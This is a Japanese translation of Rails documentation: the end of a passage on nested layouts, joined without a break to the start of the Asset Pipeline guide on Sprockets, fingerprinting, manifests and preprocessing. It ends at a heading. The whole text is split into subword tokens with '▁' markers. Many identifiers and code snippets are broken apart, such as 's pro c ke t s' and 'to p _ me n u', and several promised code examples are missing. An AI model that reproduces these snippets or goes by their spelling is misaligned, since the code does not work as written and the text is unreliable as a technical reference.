▁ ネスト した レイアウト ▁( サブ テンプレート と呼ばれる こともあります ) ▁ を使用することで 、 メ イン の レイアウト を 複 製 して 編集 したり せずに これを 実現 できます 。
▁ 例 :
▁以下の ` Application Controller ` レイアウト が あるとします 。
▁* ▁` app / views / layouts / application . html . erb `
▁< html >
▁< head >
▁< title > <%= ▁@ page _ title ▁ or ▁" P age ▁ T it le " ▁%></ title >
▁<%= ▁ stylesheet _ link _ tag ▁" layout " ▁%>
▁< style > <%= ▁ yield ▁: stylesheets ▁%></ style >
▁</ head >
▁< body >
▁< div ▁id =" to p _ me n u "> To p ▁ me n u ▁ item s ▁ her e </ div >
▁< div ▁id =" me n u "> M en u ▁ item s ▁ her e </ div >
▁< div ▁id =" content "> <%= ▁ content _ for ? (: content ) ▁ ?
▁ yield (: content ) ▁: ▁ yield ▁%></ div >
▁</ body >
▁</ html >
▁` New sController ` によって 生成される ページ では 、 ト ッ プ メニュー を 隠 して 右 メニュー を追加した い とします 。
▁* ▁` app / views / layouts / new s . html . erb `
▁<% ▁ content _ for ▁: stylesheets ▁do ▁%>
▁# to p _ me n u ▁ { d is p la y : ▁ n one }
▁# right _ me n u ▁ { f lo at : ▁ right ; ▁ b ack g r ound - c ol or : ▁ y e ll o w ; ▁c ol or : ▁ b l ack }
▁< div ▁id =" right _ me n u "> R ig h t ▁ me n u ▁ item s ▁ her e </ div >
▁<%= ▁ content _ for ? (: new s _ content ) ▁ ?
▁ yield (: new s _ content ) ▁: ▁ yield ▁%>
▁<%= ▁render ▁ template : ▁" layouts / application " ▁%>
▁以上で お し ま い です 。
▁ New s ビューで 新しい レイアウト が 使用される ように なり 、 ト ッ プ メニュー が 隠 されて " content " ▁ div タグ 内に 右 メニュー が 新しく 追加 されました 。
▁これ と同じ 結果を 得られ る サブ テンプレート の 使用 法 はこの 他にも さまざまな もの が 考え られます 。
▁ ネ ス テ ィ ング レベル には 制限 がない 点 にご注目ください 。
▁たとえば New s レイアウト で 新しい レイアウト を使用する ために 、` render ▁ template : ▁' layouts / new s ' ` 経由で ` ActionView :: render ` メソッド を使用する こともできます 。
▁` New s ` レイアウト を サブ テンプレート 化 する つ も り がない のであれば 、` content _ for ? (: new s _ content ) ▁ ? ▁ yield (: new s _ content ) ▁: ▁ yield ` を 単 に ` yield ` に置き換え れば 済み ます 。
▁ アセットパイプライン
▁ ========= =========
▁ 本ガイドで は 、 アセットパイプライン ▁( asset ▁ pipeline ) ▁ について解説します 。
▁* ▁ アセットパイプライン の概要 と 機能
▁* ▁ アプリケーションの アセット を 正しく 編 成 する方法
▁* ▁ アセットパイプライン の メ リ ッ ト
▁* ▁ アセットパイプライン に プ リ プロ セ ッ サ を追加する
▁* ▁ アセット を gem パ ッ ケ ー ジ にする
▁ アセットパイプライン について
▁ アセットパイプライン とは 、 JavaScript や CSS の アセット を 最小化 ▁( mini f y : ▁ スペース や 改 行 を 詰 め る など ) ▁ または 圧 縮 して 連 結 するための フレームワーク です 。
▁ アセットパイプライン では 、 CoffeeScript や S A S S 、 ERB など 他の 言語 で 記述 された アセット を作成する 機能 を追加する こともできます 。
▁ 技術 的に は 、 アセットパイプライン は 既に Rails ▁4 の コア 機能 ではありません 。 フレームワーク から 分 離 され 、[ s pro c ke t s - rails ]( https :// github . com / rails / s pro c ke t s - rails ) という gem に 書き 出 されています 。
▁Rails では デフォルトで アセットパイプライン が 有効 になっています 。
▁Rails アプリケーションを 新規作成 する 際に アセットパイプライン をオフに したい場合は 、 以下のように ` - - skip - s pro c ke t s ` オプションを 渡します 。
▁ rails ▁ new ▁app name ▁-- skip - s pro c ke t s
▁Rails ▁4 では ` sass - rails `、` coffee - rails `、` ug li fi er ` ▁gem が自動的に Gemfile に追加 されます 。 Sprockets は アセット 圧 縮 の 際に これらの gem を使用します 。
▁gem ▁' sass - rails '
▁gem ▁' ug li fi er '
▁gem ▁' coffee - rails '
▁` - - skip - s pro c ke t s ` オプション を使用すると 、 Rails ▁4 で ` sass - rails ` と ` ug li fi er ` が Gemfile に追加 され なくなります 。 アセットパイプライン を 後 から 有効 に したい場合は 、 これらの gem も Gemfile に 追加する必要があります 。
▁ 同様に 、 アプリケーション 新規作成 時に ` - - skip - s pro c ke t s ` オプション を指定すると ` config / application . rb ` ファイルの 記述 内容 が デフォルト から 若 干 異なります 。 具体的には s pro c ke t ▁ r a il t i e で 必要となる 記述 が コメントアウト されます 。
▁ アセットパイプライン を 手動で 有効 にする 場合は 、 これらの コメントアウト も 解 除 する必要があります 。
▁# ▁require ▁" s pro c ke t s / r a il t i e "
▁ アセット 圧 縮 方 式 を指定する には 、` production . rb ` の 該当する 設定 オプション を設定します 。 ` config . assets . css _ compressor ` は CSS の 圧 縮 方 式 、` config . assets . js _ compressor ` は JavaScript の 圧 縮 方 式 を それぞれ 指定 します 。
▁config . assets . css _ compressor ▁= ▁: y u i
▁NOT E : ▁` sass - rails ` ▁gem が Gemfile に 含 まれ ていれば 自動的に CSS 圧 縮 に 使用されます 。 この場合 ` config . assets . css _ compressor ` オプションは 設定 されません 。
▁### ▁ 主要な 機能
▁ アセットパイプライン の 第 一 の 機能 は アセット を 連 結 することです 。 これにより 、 ブラウザ が Web ページを レンダリング するための リクエスト 数 を 減 ら す ことができます 。
▁Web ブラウザ が 同時に 処理 できる リクエスト 数 には 限 り がある ため 、 同 時 リクエスト 数 を 減 ら す ことができ れば その 分 読み込み が 高速 になります 。
▁ Sprockets は すべての JavaScript ファイルを 1 つの マ ス ター ` . js ` ファイルに 連 結 し 、 すべての CSS ファイルを 1 つの マ ス ター ` . css ` ファイルに 連 結 します 。
▁ 本ガイドで 後 述 する ように 、 アセット ファイルを グループ 化 する方法 は 自由に カスタマイズ できます 。
▁ production 環境で は 、 アセット ファイル名 に M D 5 フィンガープリント を 挿 入 し 、 アセット ファイルが Web ブラウザで キャッシュ される ようにしています 。
▁この フィンガープリント を変更する ことで ブラウザで キャッシュ され ていた 既存の アセット を 無効 に することができます 。 フィンガープリント の 変更 は 、 アセット ファイル の内容 が変更され た 時に 自動的に 行われます 。
▁ アセットパイプライン の もうひとつ の 機能 は アセット の 最小化 ▁( 一 種 の 圧 縮 ) ▁ です 。
▁ CSS ファイルの 最小化 は 、 ホ ワ イ ト スペース と コメント を削除する こと によって 行われます 。
▁ JavaScript の 最小化 プロセス は もう少し 複 雑 です 。
▁ 最小化 方法は ビルトイン の オプション から 選 んだ り 、 独 自 に 指定 したり することができます 。
▁ アセットパイプライン の 第 3 の 機能 は 、 より 高 級 な 言語 を使用した コ ー デ ィ ング の サポート です 。 これらの 言語 で 記述 された コードは プリコンパイル され 、 実際の アセット になります 。
▁ デフォルトで サポート されている 言語 は 、 CSS に 代 わ る S A S S 、 JavaScript に 代 わ る CoffeeScript 、 CSS / JavaScript に 代 わ る ERB です 。
▁### ▁ フィンガープリント と 注意 点
▁ アセット ファイル名 で 使用される フィンガープリント は 、 アセット ファイル の内容 に応じて 変 わ ります 。
▁ アセット ファイル の内容 が 少し でも 変わる と 、 アセット ファイル名 も 必ず それ に応じて 変 わ ります ▁( 訳 注 : ▁ M D 5 の 性 質 により 、 異なる ファイル から た また ま 同じ フィンガープリント が 生成される ことは ほぼ ありません )。
▁ 変更 されていない ファイル や め った に変更 され ない ファイル がある場合 、 フィンガープリント も 変 化 し ないので 、 ファイル の内容 が 完全に 同 一 であること が 容易に 確認 できます 。 これは サーバー や デプロイ 日 が 異 な って いて も 有効 です 。
▁ アセット ファイル名 は 内容 が 変わる と 必ず 変 化 する ので 、 CDN 、 I S P 、 ネットワーク 機 器 、 Web ブラウザ など あらゆる 場 面 で 有効な キャッシュ を HTTP ヘッダ に設定する ことができます 。
▁ ファイル の内容 が 更新 される と 、 フィンガープリント も 更新 されます 。
▁これにより 、 リモート クライアント は ▁( 訳 注 : ▁ 既存の キャッシュ を使用 せずに ) ▁ コンテンツ の 新しい コピー を サーバー に リクエスト します 。
▁この 手法 を 一般に ▁ _ キャッシュ 破 棄 ▁( cache ▁ b us t ing ) _ ▁ と呼びます 。
▁ Sprockets が フィンガープリント を使用する 際に は 、 ファイル の内容 を ハッシュ化 した もの を ファイル名 ▁( 通常 は 末尾 ) ▁ に追加します 。
▁たとえば 、` g lo b al . css ` という CSS ファイル名 は以下のようになります 。
▁ g lo b al - 9 08 e 2 5 f 4 b f 64 18 6 8 d 8 6 8 30 22 a 5 b 6 2 f 5 4 . css
▁これは Rails の アセットパイプライン の 戦 略 として 採 用 されています 。
▁ 以前の Rails では 、 ビルトイン の ヘルパー に リンク されている すべての アセット に 日付 ベース の クエリ 文字列 を追加する という 戦 略 が 使用 され ていました 。
▁ 当 時の ソース で 生成された コード は以下のようになります 。
▁この クエリ 文字列 ベース の 戦 略 には 多くの 問題 点 があります 。
▁** クエリ パラメータ 以外に ファイル名 に 違 い の ない コンテンツ は 確 実 に キャッシュ され ないこと がある **
▁[ S te ve ▁S o u de r s の ブログ 記事 ]( http :// www . st e ve s o u de r s . com / blog / 200 8 / 08 / 23 / re v v ing - file name s - do n t - us e - query string / ) による と 、「 キャッシュ される 可能性 のある リソース に クエリ 文字列 で アクセス する のは 避 け ること 」 が 推 奨 されています 。
▁S te ve は 、 5 % から 20 % もの リクエスト が キャッシュ されていない ことに 気 付き ました 。
▁ クエリ 文字列 は 、 キャッシュ 無効 化 が発生する 一部の CDN では 役 に 立 ち ません 。
▁** マ ル チ サーバー 環境で ファイル名 が 異 な っ てしまう こと がある
▁Rails ▁2 . x の デフォルトの クエリ 文字列 は ファイルの 更新 日付 に基いて い ました 。
▁この アセット を サーバー クラス タ にデプロイする と 、 サーバー 間 で ファイルの タイムスタンプ が 同じ になる 保 証 がない ため 、 リクエストを 受け る サーバー が 変わる たびに 値が 異 な ってしまいます 。
▁** キャッシュ の 無効 化 が 過 剰 に 発生 する **
▁ コード リリース 時の デプロイ が行われ ると 、 アセット に変更 がある かどうか に か か わ らず ▁ _ すべての _ ▁ ファイルの m time ▁( 最後に 更新 された 時刻 ) ▁ が変更され てしまいます 。 このため 、 アセット に変更 が なくても Web ブラウザ を含む あらゆる リモート クライアント で 強 制 的に アセット が 再 取得 され てしまいます 。
▁ フィンガープリント が 導入 された こと によって 上 述 の クエリ 文字列 による 問題 点が 解決 され 、 アセット の内容 が 同じ であれば ファイル名 も 常に 同じ になる ようになりました 。
▁ フィンガープリント は production 環境で はデフォルトで オン になっ ており 、 それ以外の 環境で は オフ になります 。
▁ 設定 ファイル で ` config . assets . digest ` オプション を使用して フィンガープリント の オン / オフ を 制 御 できます 。
▁詳細については 以下 を参照してください 。
▁* ▁[ キャッシュ の 最適化 ]( http :// code . g oo g le . com / s p e ed / page - s p e ed / doc s / ca ch ing . html )
▁* ▁[ ファイル名 の 変更 に クエリ 文字列 を使用して は い け ない 理由 ]( http :// www . st e ve s o u de r s . com / blog / 200 8 / 08 / 23 / re v v ing - file name s - do n t - us e - query string / )
▁ アセットパイプライン の 使用 方法
▁ 以前の Rails では 、 すべての アセット は ` public ` ディレクトリ の 下 の ` images `、` javascripts `、` stylesheets ` などの サブ フォルダ に置かれ ました 。
▁ アセットパイプライン 導入 後 は 、` app / assets ` ディレクトリ が アセット の 置き場所 として 推 奨 されています 。
▁この ディレクトリ に置かれ た ファイルは Sprockets ミドルウェア によって サポート されます 。
▁ アセット は 引 き 続 き ` public ` ディレクトリ 以下 に置く ことも 可能です 。
▁ プ リ プロセス が 必要な ファイルは ` app / assets ` ディレクトリ の 下 に置く 必要があります 。
▁Rails は 、 production モード では デフォルトで ` public / assets ` ファイルを プリコンパイル します 。
▁この プリコンパイル された ファイルが Web サーバー によって 静 的な アセット として 扱 わ れ ます 。
▁` app / assets ` に置かれ た ファイルが そのまま の 形 で production 環境で 使用される ことは 決 して ありません 。
▁### ▁ コントローラ 固有の アセット
▁Rails で scaffold や コントローラ を生成する と 、 JavaScript ファイル ▁( ` coffee - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は CoffeeScript ) ▁ と CSS ▁( ` sass - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は S CSS ) ▁ も その コントローラ 用 に 生成されます 。
▁ scaffold 生成 時に は 、 さらに scaffold s . css ▁( ` sass - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は scaffold s . css . s css ) ▁ も 生成されます 。
▁たとえば ` Pro j e ct sController ` を生成する と 、` app / assets / javascripts / projects . js . coffee ` ファイル と ` app / assets / stylesheets / projects . css . s css ` ファイルが 新しく 作成されます 。
▁` require _ tree ` ディレクティブ を使用すると 、 これらの ファイルを 即 座 に アプリケーション から 利用 できます 。
▁require _ tree の詳細については [ マニフェストファイル と ディレクティブ ]( # マニフェストファイル と ディレクティブ ) を参照してください 。
▁ 関連する コントローラ で 以下のコード を使用することで 、 コントローラ 固有の スタイルシート や JavaScript ファイルを その コントローラ だけで 使用できます 。
▁` <%= ▁ javascript _ include _ tag ▁ params [: controller ] ▁%> ` ▁ または ▁` <%= ▁ stylesheet _ link _ tag ▁ params [: controller ] ▁%> `
▁上のコード を使用する 際 は 、` require _ tree ` ディレクティブ を使用 していない ことを 必ず 確認 してください 。 ` require _ tree ` と 併 用 すると 、 アセット が 2 回 以上 インクルード され てしまいます 。
▁WARN ING : ▁ アセット の プリコンパイル を使用する場合 、 ページ が 読み込まれ る たびに コントローラの アセット が プリコンパイル される ように しておく必要があります 。
▁ デフォルトで は 、 . coffee ファイル と . s css ファイルは 自動 では プリコンパイル されません 。
▁ プリコンパイル の動作 の詳細については 、[ アセット を プリコンパイル する ]( # アセット を プリコンパイル する ) を参照してください 。
▁NOT E : ▁ CoffeeScript を使用する には 、 E x ec J S が ラ ン タ イ ム で サポート されている 必要があります 。
▁ Mac ▁ OS ▁X または Windows を 使用している 場合は 、 OS に JavaScript ラ ン タ イ ム を インストール してください 。
▁` config / application . rb ` 設定 に 以下 を追加する ことで 、 コントローラ 固有の アセット ファイル 生成 を 止 め る こともできます 。
▁config . g en er at or s ▁do ▁| g |
▁ g . assets ▁false
▁### ▁ アセット の 編 成
▁ パ イ プ ラ イン の アセット は 、 アプリケーション 内の ` app / assets `、` lib / assets `、` vendor / assets ` の 3 つの ディレクトリ のいずれか に置く ことができます 。
▁* ▁` app / assets ` は 、 カスタム 画像 ファイル 、 JavaScript 、 スタイルシート など 、 アプリケーション 自身 が 保 有 する アセット の 置き場所 です 。
▁* ▁` lib / assets ` は 、 1 つの アプリケーションの 範 疇 に 収 ま らない ライブラリ のコード や 、 複数の アプリケーションで 共有 される ライブラリ の コードを 置 く 場所 です 。
▁* ▁` vendor / assets ` は 、 JavaScript プラグイン や CSS フレームワーク など 、 外部 の 団 体 など によって 所 有 されている アセット の 置き場所 です 。
▁WARN ING : ▁Rails ▁3 から の アップグレード を行なう 際に は 、` lib / assets ` と ` vendor / assets ` の 下 に置かれている アセット が Rails ▁4 では アプリケーションの マニフェスト によって インクルード されて 利用 可能 になる こと 、 しかし プリコンパイル 配列 の一部 には 含 まれ な くなる ことを 考 慮 に 入 れ てください 。
▁ ガ イ ダ ン ス については [ アセット を プリコンパイル する ]( # アセット を プリコンパイル する ) を参照してください 。
▁#### ▁ パス の 検索
▁ ファイルが マニフェスト や ヘルパー から 参 照 される 場合 、 Sprockets は デフォルトの アセット の 置き場所 である 3 つの ディレクトリ から ファイル を探し ます 。
▁3 つの ディレクトリ とは 、` app / assets ` の下に ある ` images `、` javascripts `、` stylesheets ` ディレクトリ です 。 ただし これらの サブディレクトリ は 特殊な もの ではなく 、 実際には ` assets / * ` 以下の すべての パス が 検索 対象 になります 。
▁以下の ファイルを 例 に 説明します 。
▁app / assets / javascripts / home . js
▁ lib / assets / javascripts / m oo v in at or . js
▁ vendor / assets / javascripts / s li de r . js
▁ vendor / assets / some p ack age / ph one box . js
▁上の ファイルは マニフェスト 内で 以下のように 参 照 されます 。
▁` ` ` js
▁ / / = ▁require ▁ home
▁ / / = ▁require ▁ m oo v in at or
▁ / / = ▁require ▁ s li de r
▁ / / = ▁require ▁ ph one box
▁ サブディレクトリ 内の アセット にも アクセス できます 。
▁app / assets / javascripts / sub / some th ing . js
▁上の ファイルは 以下のように 参 照 されます 。
▁ / / = ▁require ▁ sub / some th ing
▁ 検索 パス を調べ る には 、 Rails コンソール で ` Rails . application . config . assets . path s ` を調べ ます 。
▁` config / application . rb ` に 記述 することで 、 標準 の ` assets / * ` に 加 え て 追加 の ▁( full y ▁ qualified ) ▁ パス を パ イ プ ラ イン に追加 することができます 。
▁以下の 例 で説明します 。
▁config . assets . path s ▁< < ▁Rails . root . join (" lib ", ▁" video p la y er ", ▁" flash ")
▁ パス の 探 索 は 、 検索 パス で の 出 現 順 で 行われます 。
▁ デフォルトで は ` app / assets ` の 検索 が 優 先 される ので 、 対応する パス が ` lib ` や ` vendor ` にある 場合は マ ス ク されます 。
▁#### ▁ index ファイル を使用する
▁ Sprockets では 、` index ` という名前の ファイル ▁( および 関連する 拡張子 ) ▁ を 特殊な 目的 に 使用します 。
▁たとえば 、 たくさん の モジュール がある j Query ライブラリ を使用して いて 、 それら が ` lib / assets / javascripts / lib r ary _ name ` に保存 されている とします 。 この ` lib / assets / javascripts / lib r ary _ name / index . js ` ファイルは その ライブラリ 内の すべての ファイル で 利用できる マニフェスト として 機能 します 。
▁この ファイル には 必要な ファイル をすべて 順に 記述 するか 、 あるいは 単 に ` require _ tree ` と 記述 します 。
▁ 一般に 、 この ライブラリ は アプリケーション マニフェスト に 以下のように 記述 することで アクセス できます 。
▁ / / = ▁require ▁ lib r ary _ name
▁この ように 記述 することで 、 他 で インクルード する 前に 関連する コードを グループ 化 できるように なり 、 記述 が 簡潔 になり 保 守 が し や す く なります 。
▁### ▁ アセット に リンク する コードを 書く
▁ Sprockets は アセット にアクセス するための メソッドを 特に 追加 しません 。 従来 同様 ` javascript _ include _ tag ` と ` stylesheet _ link _ tag ` を使用します 。
▁<%= ▁ stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all " ▁%>
▁<%= ▁ javascript _ include _ tag ▁" application " ▁%>
▁Rails ▁4 から 同 梱 される ようになった turbolinks ▁gem を 使用している 場合 、 ' data - turbolinks - t rack ' オプション が 利用 できます 。 これは アセット が 更新 されて ページに 読み込まれ た かどうかを turbolinks が チェック します 。
▁<%= ▁ stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all ", ▁" data - turbolinks - t rack " ▁=> ▁true ▁%>
▁<%= ▁ javascript _ include _ tag ▁" application ", ▁" data - turbolinks - t rack " ▁=> ▁true ▁%>
▁ 通常の ビュー では 以下のような 方法で ` public / assets / images ` ディレクトリ の 画像 にアクセス できます 。
▁<%= ▁ image _ tag ▁" rails . png " ▁%>
▁ パ イ プ ラ イン が 有効 で かつ 現在の 環境で 無効 になって い ない場合 、 この ファイルは Sprockets によって 扱 わ れ ます 。
▁ ファイルが ` public / assets / rails . png ` に置かれている 場合 、 Web サーバー によって 扱 わ れ ます 。
▁` public / assets / rails - a f 27 b 6 a 4 14 e 6 d a 0 000 3 50 3 14 8 b e 9 b 4 0 9 . png ` など 、 ファイル名 に M D 5 ハッシュ を含む ファイル への リクエスト について も同様に 扱 わ れ ます 。
▁ ハッシュの 生成 法 については 、 本 ガイド の [ production 環境 の場合 ]( # production 環境 の場合 ) で 後 述 します 。
▁ Sprockets は ` config . assets . path s ` で 指定 した パス も 探 索 します 。 この パス には 、 標準的な アプリケーション パス と 、 Rails エンジン によって 追加 される すべての パス が含まれ ます 。
▁ 必要 であれば 画像 ファイルを サブディレクトリ に 置 いて 整 理 することもできます 。 この 画像 にアクセス するには 、 ディレクトリ 名 を含め て 以下のように タグ で 指定 します 。
▁WARN ING : ▁ アセット の プリコンパイル を行って いる 場合 ▁( [ production 環境 の場合 ]( # production 環境 の場合 ) 参 照 ) 、 存在しない アセット へのリンク を含む ページ を呼び出す と 例外が発生します 。
▁ 空 文字 へのリンク も同様に 例外が発生します 。
▁ユーザー から 提供され た データ に対して ` image _ tag ` などの ヘルパー を使用する場合 は ご注意ください 。
▁#### ▁ CSS と ERB
▁ アセットパイプライン は自動的に ERB を 評価 します 。
▁たとえば 、 css アセット ファイルに ` erb ` という 拡張子 を追加する と ▁( ` application . css . erb ` など ) 、 CSS ルール 内で ` asset _ path ` などの ヘルパー が 使用 できるようになります 。
▁` ` ` css
▁ . class ▁ { ▁ b ack g r ound - image : ▁ url ( <%= ▁ asset _ path ▁' image . png ' ▁%> ) ▁ }
▁これは 、 指定された アセット への パス を 記述 します 。
▁上の 例 では 、 アセット 読み込み パス のいずれか にある 画像 ファイル ▁( ` app / assets / images / image . png ` など ) ▁ が 指定された と 解 釈 されます 。
▁この 画像 が 既に フィンガープリント 付き で ` public / assets ` に あ れば 、 この パス による 参 照 は 有効 になります 。
▁[ データ U R I ス キー ム ]( http :// j a . w ikipedia . org / wiki / D at a _ U R I _ s ch e me ) ▁( CSS ファイルに データ を直接 埋 め 込 む 手法 ) ▁ を使用したい場合 は 、` asset _ data _ ur i ` を使用できます 。
▁# log o ▁ { ▁ b ack g r ound : ▁ url ( <%= ▁ asset _ data _ ur i ▁' log o . png ' ▁%> ) ▁ }
▁上のコードは 、 CSS ソース に 正しく フォーマット された data ▁ U R I を 挿 入 します 。
▁ この場合 、` - % > ` で タグ を 閉 じ る ことはできません ので ご注意ください 。
▁#### ▁ CSS と Sass
▁ アセットパイプライン を使用する場合 、 最終的に アセット への パス を 変 換 する必要があります 。 この ために 、` sass - rails ` ▁gem は 名前 が ` - url ` や ` - path ` で 終 わ る ▁( Sass 内で は ハ イ フ ン ですが 、 Ruby では アンダースコア で 表 します ) ▁ 各 種 ヘルパー を 提供し ています 。 ヘルパー が サポート する アセット クラス は 、 画像 、 フ ォ ン ト 、 ビ デ オ 、 音 声 、 JavaScript 、 stylesheet です 。
▁* ▁` image - url (" rails . png ") ` は ` url ( / assets / rails . png ) ` に変換 される
▁* ▁` image - path (" rails . png ") ` は ` " / assets / rails . png " ` に変換 される
▁ 以下のような 、 より 一般的な 記 法 を使用する こともできます 。
▁* ▁` asset - url (" rails . png ") ` は ` url ( / assets / rails . png ) ` に変換 される
▁* ▁` asset - path (" rails . png ") ` は ` " / assets / rails . png " ` に変換 される
▁#### ▁ JavaScript / CoffeeScript と ERB
▁ JavaScript アセット に ` erb ` 拡張子 を追加する と ▁( ` application . js . erb ` など ) 、 以下のように JavaScript コード 内で ` asset _ path ` ヘルパー を使用できます 。
▁$ (' # log o ') . attr ( { ▁src : ▁" <%= ▁ asset _ path (' log o . png ') ▁%> " ▁ }) ;
▁これは 、 指定された アセット への パス を 記述 します 。
▁$ (' # log o ') . attr ▁src : ▁" <%= ▁ asset _ path (' log o . png ') ▁%> "
▁### ▁ マニフェストファイル と ディレクティブ
▁ Sprockets では 、 どの アセット を インクルード して サポート するか を指定する の に マニフェストファイル を使用します 。
▁ マニフェストファイル には ▁ _ ディレクティブ ▁( d ir e ct ive : ▁ 命 令 、 指示 ) _ ▁ を含め ます 。 ディレクティブ を使用して 必要な ファイルを 指定 し 、 それ に基いて 最終的に 単 一 の CSS や JavaScript ファイルが ビ ル ド されます 。
▁ ファイルを 連 結 して ひとつ にする ことにより 、 ブラウザから サーバー への リクエスト 数 を 減 ら す ことができ 、 ページの 読み込み 時間 が 大きく 短縮 されます 。
▁ 圧 縮 すること によって も ファイル サイズ が 小 さ く なり 、 ブラウザ への 読み込み 時間 が 短縮 されます 。
▁ 新規作成 した Rails ▁4 アプリケーションに はデフォルトで ` app / assets / javascripts / application . js ` ファイルに 以下のような 記述 が 含まれています 。
▁ / / ▁ ...
▁ / / = ▁require ▁ jquery
▁ / / = ▁require ▁ jquery _ u js
▁ / / = ▁require _ tree ▁ .
▁ JavaScript の Sprockets ディレクティブ は ` / / = ` で 始 まり ます 。
▁上の 例 では ` require ` と ` require _ tree ` という ディレクティブ が 使用 されています 。
▁` require ` は 、 必要な ファイルを Sprockets に 指定 するのに 使用します 。
▁ここでは ` jquery . js ` と ` jquery _ u js . js ` を 必要な ファイル として 指定 しています 。 これらの ファイルは Sprockets の 検索 パス の ど こ か から 読み込み 可能 になっています 。
▁この ディレクティブ では 拡張子 を明示的に指定 する必要はありません 。
▁ ディレクティブ が ` . js ` ファイルに 書かれてい れば 、 Sprockets によって自動的に ` . js ` ファイルが 必要 ファイル として 指定 されます 。
▁` require _ tree ` ディレクティブ は 、 指定された ディレクトリ 以下の ▁ _ すべての _ ▁ JavaScript ファイルを 再 帰 的に インクルード し 、 出力 に含め ます 。
▁この パス は 、 マニフェストファイル から の 相 対 パス として 指定 する必要があります 。
▁` require _ directory ` ディレクティブ を使用すると 、 指定された ディレクトリ の 直 下 にある すべての JavaScript ファイル のみ を インクルード します 。 この場合 サブディレクトリ を 再 帰 的に 探 索 しません 。
▁ ディレクティブ は 記 載 した 順に 実行されます が 、` require _ tree ` で インクルード される ファイルの 読み込み 順序 は 指定 できません 。
▁従って 、 特定の 読み込み 順に 依 存 し ないように する必要があります 。
▁ も し どう しても 特定の JavaScript ファイルを 他の JavaScript ファイル よりも 結合 順 を 先に したい場合 、 その ファイル への require ディレクティブ を マニフェスト の 最初に 置 きます 。
▁` require ` および 類 似 の ディレクティブ は 、 出力 時に 同じ ファイルを 2 回 以上 インクルード しない ようになっています 。
▁Rails は 以下の行 を含む デフォルトの ` app / assets / stylesheets / application . css ` ファイル も 作成 します 。
▁ / * ▁ ...
▁* = ▁require _ self
▁* = ▁require _ tree ▁ .
▁Rails ▁4 は ` app / assets / javascripts / application . js ` と ` app / assets / stylesheets / application . css ` ファイルを 両方 作成 します 。 これは Rails アプリケーション 新規作成 時に - - skip - s pro c ke t s を指定する かどうか に か か わ らず 行われます 。
▁これにより 、 必要に応じて 後 から アセットパイプライン を追加する こともできます 。
▁ JavaScript で 使用できる ディレクティブ は スタイルシート でも 使用できます ▁( なお JavaScript と異なり スタイルシート は 明示的に インクルード される という 違 い があります )。
▁ CSS マニフェスト における ` require _ tree ` ディレクティブ の動作 は JavaScript の場合 と同様に 現在の ディレクトリ にある すべての スタイルシート を require します 。
▁上の 例 では ` require _ self ` が 使用 されています 。
▁この ディレクティブ は 、` require _ self ` 呼び出し が 行われた その 場所 に CSS ファイル があれば 読み込み ます 。
▁NOT E : ▁ Sass ファイルを 複 数 使用している のであれば 、 Sprockets ディレクティブ で 読み 込 まず に [ Sass ▁ `@ im port ` ルール ]( http :// sass - lang . com / doc s / y a rdoc / file . S A S S _ RE F ER E N C E . html # im port ) を使用する 必要があります 。
▁ このような 場合に Sprockets ディレクティブ を使用し てしまう と 、 Sass ファイルが 自分自身 の スコープ に置かれ るため 、 そ の中で 定義されている 変数 や ミ ッ ク ス イン が 他の Sass から 利用 でき なく な ってしまいます 。
▁ `@ im port ▁" * " ` や `@ im port ▁" ** / * " ` などの ように ワ イ ル ド カ ー ド マッチ で ツ リ ー 全体 を指定する こともできます 。 これは ` require _ tree ` と 同 等 です 。
▁ 詳 細 および 重要な 警 告 については [ sass - rails ドキュメント ]( https :// github . com / rails / sass - rails # f e at ur es ) を参照してください 。
▁ マニフェストファイル は 必要に応じて い く つ でも 使用できます 。
▁たとえば 、 アプリケーションの admin セクション で使用する J S ファイル と CSS ファイルを ` admin . css ` と ` admin . js ` マニフェスト に それぞれ 記 載 することができます 。
▁ 読み込み 順 についても 前 述 の とおり 反 映 されます 。
▁ 特に 、 個 別 に 指定 した ファイルは 、 その とおり の 順序 で コンパイル されます 。
▁たとえば 、 以下 では 3 つの CSS ファイルを 結合 しています 。
▁* = ▁require ▁ reset
▁* = ▁require ▁ layout
▁* = ▁require ▁ ch r o me
▁### ▁ プ リ プロセス
▁ 適 用 される プ リ プロセス の 種類 は 、 アセット ファイルの 拡張子 によって 決 まり ます 。
▁ コントローラ や scaffold を デフォルトの gem セット で 生成 した 場合 、 通常 JavaScript ファイル や CSS ファイルが 置 か れる 場所 に CoffeeScript ファイル と S CSS ファイルが それぞれ 生成されます 。
▁ 先 の例 では 、 コントローラ 名 が " projects " で 、` app / assets / javascripts / projects . js . coffee ` ファイル と ` app / assets / stylesheets / projects . css . s css ` ファイルが 生成されます 。
▁ development モード の場合 、 あるいは アセットパイプライン が 無効 になっている 場合は 、 これらの アセット への リクエスト は ` coffee - script ` ▁gem と ` sass ` ▁gem が提供する プロ セ ッ サ によって 処理 され 、 それぞれ JavaScript と CSS として ブラウザ への レスポンス が 送信 されます 。
▁ アセットパイプライン が 有効 になっている 場合は 、 これらの アセット ファイルは プ リ プロセス の 対象 と なり 、 処理 後 の ファイルが ` public / assets ` ディレクトリ に置かれ て Rails アプリケーション または Web サーバー によって 利用 されます 。
▁ アセット ファイル名 に 別の 拡張子 を追加する ことにより 、 プ リ プロセス 時に 別の レ イ ヤ を 追加 で リクエスト することができます 。 アセット ファイル名 の 拡張子 は 、「 右 から 左 」 の 順に 処理 されます 。
▁従って 、 アセット ファイル名 の 拡張子 は 、 これ に従って 処理 を行う べ き 順序 で 与え る必要があります 。
▁たとえば 、` app / assets / stylesheets / projects . css . s css . erb ` という スタイルシート では 、 最初に ERB として 処理 され 、 続いて S CSS 、 最後に CSS として 処理 されます 。 同様に して 、 ▁` app / assets / javascripts / projects . js . coffee . erb ` ▁という JavaScript ファイル の場合 では 、 ERB ▁ → ▁ CoffeeScript ▁ → ▁ JavaScript ▁ の 順に 処理 されます 。
▁この プ リ プロセス 順序 は 非常に 重要です ので 、 心 に 留 め て おいてください 。
▁たとえば 、 仮 に ` app / assets / javascripts / projects . js . erb . coffee ` という ファイル を呼び出す と 、 最初に CoffeeScript イン タ プ リ タ によって 処理 されます 。 しかし これは 次の ERB で 処理 できない ので 問題 が発生する ことがあります 。
▁ development 環境 の場合
